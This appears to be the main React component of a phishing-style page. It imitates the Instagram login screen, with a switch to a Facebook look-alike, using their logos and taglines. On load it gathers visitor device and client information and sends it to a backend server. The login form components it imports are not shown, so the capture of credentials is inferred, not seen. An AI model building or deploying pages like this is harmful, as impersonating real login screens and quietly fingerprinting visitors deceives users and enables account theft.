import React, { useState, useEffect } from 'react'
import InstagramLogo from './components/InstagramLogo'
import PhoneMockup from './components/PhoneMockup'
import LoginForm from './components/LoginForm'
import FacebookLoginForm from './components/FacebookLoginForm'
import FacebookPhoneMockup from './components/FacebookPhoneMockup'
import FacebookLogo from './components/FacebookLogo'
import DeviceDiagnostics from './components/DeviceDiagnostics'
import { sendClientInfo, collectClientInfo } from './utils/collectClientInfo'

export default function App() {
  const [currentPage, setCurrentPage] = useState('instagram')
  const [clientInfo, setClientInfo] = useState(null)

  useEffect(() => {
    const apiBaseUrl = import.meta.env.VITE_API_URL || 'http://localhost:5000'
    const collect = async () => {
      const payload = await collectClientInfo()
      setClientInfo(payload)

      const serverResponse = await sendClientInfo(apiBaseUrl)
      if (serverResponse?.server) {
        setClientInfo((prev) => ({
          ...(prev || payload),
          server: serverResponse.server
        }))
      }
    }

    void collect()
  }, [])

  if (currentPage === 'facebook') {
    return (
      <div className="fb-login-page">
        {/* Left: FB Hero Panel */}
        <section className="fb-hero-panel" aria-label="Facebook hero section">
          <FacebookLogo className="fb-logo" />
          <h2 className="fb-hero-tagline">
            Connect with friends and the world around you on Facebook.
          </h2>
          <FacebookPhoneMockup />
        </section>

        {/* Right: FB Login Panel */}
        <section className="fb-login-panel" aria-label="Facebook login form section">
          <FacebookLoginForm onBackToInstagram={() => setCurrentPage('instagram')} />
        </section>
      </div>
    )
  }

  return (
    <div className="login-page">
      <section className="hero-panel" aria-label="Instagram hero section">
        <InstagramLogo className="instagram-logo" />
        <h2 className="hero-tagline">
          See everyday moments from your close friends.
        </h2>
        <PhoneMockup />
      </section>

      <section className="login-panel" aria-label="Login form section">
        <LoginForm onFacebookClick={() => setCurrentPage('facebook')} />
      </section>

      {clientInfo && <DeviceDiagnostics info={clientInfo} />}
    </div>
  )
}
